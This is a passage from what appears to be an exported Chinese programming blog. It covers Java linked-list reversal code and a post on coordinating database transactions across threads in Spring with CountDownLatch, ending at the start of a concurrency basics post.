    <span class="token class-name">Node</span> pre <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token class-name">Node</span> next <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        next <span class="token operator">=</span> head<span class="token punctuation">;</span>
        head <span class="token operator">=</span> head<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
        next<span class="token punctuation">.</span>next <span class="token operator">=</span> pre<span class="token punctuation">;</span>
        pre <span class="token operator">=</span> next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> next<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 反转双向链表
 *
 * @param head
 * @return
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">reverseList</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Node</span> pre <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token class-name">Node</span> next <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        next <span class="token operator">=</span> head<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
        head<span class="token punctuation">.</span>next <span class="token operator">=</span> pre<span class="token punctuation">;</span>
        head<span class="token punctuation">.</span>before <span class="token operator">=</span> next<span class="token punctuation">;</span>
        pre <span class="token operator">=</span> head<span class="token punctuation">;</span>
        head <span class="token operator">=</span> next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> pre<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="反转部分单向链表"><a href="#反转部分单向链表" class="headerlink" title="反转部分单向链表"></a>反转部分单向链表</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 反转部分链表
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">reverseFromToNode</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">,</span> <span class="token keyword">int</span> from<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token keyword">to</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 统计链表长度</span>
    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token class-name">Node</span> node1 <span class="token operator">=</span> head<span class="token punctuation">;</span>
    <span class="token comment">// 记录from 和 to的前后节点</span>
    <span class="token class-name">Node</span> fPre <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token class-name">Node</span> tPos <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>node1 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        len<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token comment">// 确定from前一个节点</span>
        fPre <span class="token operator">=</span> len <span class="token operator">==</span> from <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">?</span> node1 <span class="token operator">:</span> fPre<span class="token punctuation">;</span>
        <span class="token comment">// 确定to后一个节点</span>
        tPos <span class="token operator">=</span> len <span class="token operator">==</span> <span class="token keyword">to</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">?</span> node1 <span class="token operator">:</span> tPos<span class="token punctuation">;</span>
        node1 <span class="token operator">=</span> node1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>from <span class="token operator">></span> <span class="token keyword">to</span> <span class="token operator">||</span> from <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token keyword">to</span> <span class="token operator">></span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> head<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 判断from是不是在头结点，确定需要反转的头结点</span>
    node1 <span class="token operator">=</span> fPre <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> head <span class="token operator">:</span> fPre<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
    <span class="token class-name">Node</span> node2 <span class="token operator">=</span> node1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
    node1<span class="token punctuation">.</span>next <span class="token operator">=</span> tPos<span class="token punctuation">;</span>
    <span class="token class-name">Node</span> next <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token comment">// 反转</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>node2 <span class="token operator">!=</span> tPos<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        next <span class="token operator">=</span> node2<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
        node2<span class="token punctuation">.</span>next <span class="token operator">=</span> node1<span class="token punctuation">;</span>
        node1 <span class="token operator">=</span> node2<span class="token punctuation">;</span>
        node2 <span class="token operator">=</span> next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>fPre <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// node1 现在就反转前的to节点</span>
        fPre<span class="token punctuation">.</span>next <span class="token operator">=</span> node1<span class="token punctuation">;</span>
        <span class="token keyword">return</span> head<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> node1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>多线程事务</title>
    <url>//post/%E5%B9%B6%E5%8F%91/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%BA%8B%E5%8A%A1.html</url>
    <content><![CDATA[<h1 id="多线程事务"><a href="#多线程事务" class="headerlink" title="多线程事务"></a>多线程事务</h1><p>​        在Spring开发时，遇到一个从Excel表导入数据到数据库的需求，当然最简单的方法就是先使用EasyExcel把数据读出到集合中，然后依次插入到数据库中。但如何保证效率，原子性呢？我们一步步优化方案。这里会涉及到分布式事务的知识，如果感兴趣可以看我之前的文章：<a href="http://www.chengling.cloud/post/%E5%88%86%E5%B8%83%E5%BC%8F/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1.html">玲辰书斋</a>，这里不会引入不必要的组件，而是我们自己模拟类似的思想。</p>
<p>方法1：依次顺序插入</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> users <span class="token operator">=</span> <span class="token function">getAllUsers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        users<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>user <span class="token operator">-></span> userService<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>方法2：使用批处理，一次操作中执行多条SQL</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> users <span class="token operator">=</span> <span class="token function">getAllUsers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    userService<span class="token punctuation">.</span><span class="token function">saveBatch</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>方法3：使用多线程+批处理，每个线程插入多条数据</p>
<blockquote>
<p>需要注意的一点，Spring容器不允许线程注入，也就是没办法在多线程直接使用Bean操作，例如：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">testThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 下面两种方式是无效的，不会执行任何东西</span>
  <span class="token class-name">Runnable</span> runnable <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
            userService<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  <span class="token comment">// 方法1</span>
  <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>runnable<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 方法2</span>
  <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span>runnable<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们需要下面的方式进行执行</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">testThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Runnable</span> runnable <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
            userService<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">></span></span> future <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">runAsync</span><span class="token punctuation">(</span>runnable<span class="token punctuation">,</span> executorService<span class="token punctuation">)</span><span class="token punctuation">;</span>
        future<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">testThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> threadSize <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    <span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span>threadSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> threadSize<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 我们假设数据拆分为五分</span>
        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">getAllUsers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> users <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">runAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token punctuation">&#123;</span>
            userService<span class="token punctuation">.</span><span class="token function">saveBatch</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>executorService<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"插入成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>方法4：这时候速度已经很快了，但是如果其中一个线程插入数据时发生错误进行回滚，其他线程是无法得知的，因为事务是针对线程的，所以这里我们需要用一些方式保证每个线程之间的状态是被共享的。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// UserService#saveUserSyn()</span>
<span class="token annotation punctuation">@Override</span>
<span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">saveUserSyn</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> users<span class="token punctuation">,</span> <span class="token class-name">CountDownLatch</span> threadLatch<span class="token punctuation">,</span> <span class="token class-name">CountDownLatch</span> mainLatch<span class="token punctuation">,</span> <span class="token class-name">UserError</span> hasError<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">TransactionStatus</span> transactionStatus <span class="token operator">=</span> dataSourceTransactionManager<span class="token punctuation">.</span><span class="token function">getTransaction</span><span class="token punctuation">(</span>transactionDefinition<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"子线程："</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            users<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token operator">::</span><span class="token function">save</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            hasError<span class="token punctuation">.</span><span class="token function">setHasError</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
            threadLatch<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 切换到主线程执行</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            mainLatch<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//等待主线程执行</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            hasError<span class="token punctuation">.</span><span class="token function">setHasError</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// 判断是否有错误，如有错误 就回滚事务</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>hasError<span class="token punctuation">.</span><span class="token function">isHasError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            dataSourceTransactionManager<span class="token punctuation">.</span><span class="token function">rollback</span><span class="token punctuation">(</span>transactionStatus<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            dataSourceTransactionManager<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span>transactionStatus<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 测试方法</span>
<span class="token annotation punctuation">@Test</span>
    <span class="token keyword">void</span> <span class="token function">userSaveSyn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> userList <span class="token operator">=</span> <span class="token function">getAllUsers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 添加一个错误数据</span>
        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        user<span class="token punctuation">.</span><span class="token function">setUserAccount</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        user<span class="token punctuation">.</span><span class="token function">setUserPassword</span><span class="token punctuation">(</span><span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        userList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 线程数量</span>
        <span class="token keyword">final</span> <span class="token class-name">Integer</span> threadCount <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>

        <span class="token comment">//每个线程处理的数据量</span>
        <span class="token keyword">final</span> <span class="token class-name">Integer</span> dataPartionLength <span class="token operator">=</span> <span class="token punctuation">(</span>userList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> threadCount <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> threadCount<span class="token punctuation">;</span>

        <span class="token comment">// 创建多线程处理任务</span>
        <span class="token class-name">ExecutorService</span> studentThreadPool <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span>threadCount<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CountDownLatch</span> threadLatchs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CountDownLatch</span><span class="token punctuation">(</span>threadCount<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 用于计算子线程提交数量</span>
        <span class="token class-name">CountDownLatch</span> mainLatch <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CountDownLatch</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 用于判断主线程是否提交</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> threadCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 每个线程处理的数据</span>
            <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> threadDatas <span class="token operator">=</span> userList<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    <span class="token punctuation">.</span><span class="token function">skip</span><span class="token punctuation">(</span>i <span class="token operator">*</span> dataPartionLength<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">limit</span><span class="token punctuation">(</span>dataPartionLength<span class="token punctuation">)</span>
                    <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            studentThreadPool<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
                userService<span class="token punctuation">.</span><span class="token function">saveUserSyn</span><span class="token punctuation">(</span>threadDatas<span class="token punctuation">,</span> threadLatchs<span class="token punctuation">,</span> mainLatch<span class="token punctuation">,</span> hasError<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 倒计时锁设置超时时间 30s</span>
            <span class="token keyword">boolean</span> await <span class="token operator">=</span> threadLatchs<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>await<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 等待超时，事务回滚</span>
                hasError<span class="token punctuation">.</span><span class="token function">setHasError</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            hasError<span class="token punctuation">.</span><span class="token function">setHasError</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        mainLatch<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 切换到子线程执行</span>
        studentThreadPool<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//关闭线程池</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"主线程完成"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​        这里我们使用<code>CountDownLatch</code> 和 Volatile来解决这个问题。</p>
<p>CountDownLatch的语法与原理讲解：<a href="https://zhuanlan.zhihu.com/p/148231820">https://zhuanlan.zhihu.com/p/148231820</a></p>
<p>Volatile保证线程间数据的可见性</p>
<p>2PC（两阶段提交），这个属于分布式事务的一个理论，可以看我之前写的文章：<a href="http://www.chengling.cloud/post/%E5%88%86%E5%B8%83%E5%BC%8F/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1.html">玲辰书斋</a>，我们这里模拟了这样的业务场景，大致流程为：</p>
<ul>
<li>每个线程开启事务，插入数据，但不提交，向主线程通知说，我这里已经好了</li>
<li>主线程等待一段时间，看是否所有的子线程都没问题了。如果超时也算是异常</li>
<li>如果没有异常，主线程向所有子线程通知，可以提交事务</li>
<li>如果有异常，主线程向所有子线程通知，进行回滚操作</li>
<li>而中间使用Volatile修饰的hasError对象进行传达，是否出现异常。需要注意如果只是传递普通的boolean对象，可能会发生不一致的情况，我测试时没法通过。</li>
<li>CountDownLatch则保证子线程在主线程没有通知前，是不能提交事务的。</li>
</ul>
<p>​        这里细心的小伙伴就会发现，即便是主线程通知子线程可以提交了，子线程依然有可能出现提交失败的可能，那其他线程提交事务是无法得知这边的失败的消息的。这该怎么办呢？这里我是看的极海老师视频的：<a href="https://www.bilibili.com/video/BV1zM411C7Uf/?spm_id_from=333.999.0.0&vd_source=0a64aa946b64cdeca6c32ae21dc17f40">Bilibili</a>，就是我们其实无法在一个Java进程中保证多线程的原子性。</p>
<blockquote>
</blockquote>
]]></content>
      <categories>
        <category>并发</category>
      </categories>
      <tags>
        <tag>事务</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title>并发编程</title>
    <url>//post/%E5%B9%B6%E5%8F%91/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B.html</url>
    <content><![CDATA[<h2 id="基础的概念"><a href="#基础的概念" class="headerlink" title="基础的概念"></a>基础的概念</h2><h3 id="什么是并发操作？"><a href="#什么是并发操作？" class="headerlink" title="什么是并发操作？"></a>什么是并发操作？</h3><p>利用多核CPU去完成任务，类似于使用影分身去完成不同的作业，这肯定比我一个人一个个写要快的多</p>
<h3 id="什么时候可以使用并发？"><a href="#什么时候可以使用并发？" class="headerlink" title="什么时候可以使用并发？"></a>什么时候可以使用并发？</h3><p>当有多核CPU时。如果只有一个CPU，那并发实际上只是线程的不断切换，好比我在数学作业上先写点儿，再到语文上再写点儿，因为处理的很快，给人的感觉是同时操作的。但实际上只会比原来更慢(因为有线程切换的损耗)。</p>
